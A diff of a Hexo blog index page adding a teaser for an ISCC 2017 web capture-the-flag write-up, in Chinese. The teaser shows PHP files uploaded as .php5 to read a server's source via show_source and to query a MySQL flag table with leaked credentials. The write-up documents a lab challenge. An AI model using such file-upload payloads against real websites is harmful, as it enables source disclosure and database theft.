@@ -152,6 +152,77 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-ISCC-2017-Web-writeup" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/25/ISCC-2017-Web-writeup/">ISCC_2017_Web_writeup</a>
+    </h1>
+  
+
+        
+        <a href="/2017/05/25/ISCC-2017-Web-writeup/" class="archive-article-date">
+  	<time datetime="2017-05-25T03:55:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-25</time>
+</a>
+        
+      </header>
+    
+
+
+    		
+
+
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Web签到题，来和我换flag啊！"><a href="#Web签到题，来和我换flag啊！" class="headerlink" title="Web签到题，来和我换flag啊！"></a>Web签到题，来和我换flag啊！</h2><p>POST提交三个f1ag，可在response中拿到flag。</p>
+<p><img src="/2017/05/25/ISCC-2017-Web-writeup/1.png" alt=""></p>
+<h2 id="WelcomeToMySQL"><a href="#WelcomeToMySQL" class="headerlink" title="WelcomeToMySQL"></a>WelcomeToMySQL</h2><p>F12发现数据库信息在<code>../base.php</code>。上传php5</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">show_source(<span class="string">"../base.php"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>访问upload/xxx.php可拿到base.php源码。<br>再上传一个php5连接数据库可拿到flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$conn = mysql_connect(<span class="string">"localhost"</span>, <span class="string">"iscc2017"</span>, <span class="string">"iscc2017"</span>);</div><div class="line">mysql_select_db(<span class="string">"flag"</span>,$conn);</div><div class="line">$result = mysql_query(<span class="string">"select * from flag"</span>);</div><div class="line">var_dump(mysql_fetch_row($result));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+        
+          <a class="article-more-a" href="/2017/05/25/ISCC-2017-Web-writeup/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/05/25/ISCC-2017-Web-writeup/">read more.. >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+  
     <article id="post-hexo" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -337,6 +408,10 @@ return o(t,i(n),arguments.length<3?void 0:u(arguments[2]))}})},function(t,n,r){v
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">noting</a>
               </li>
              
               <li class="article-tag-list-item">
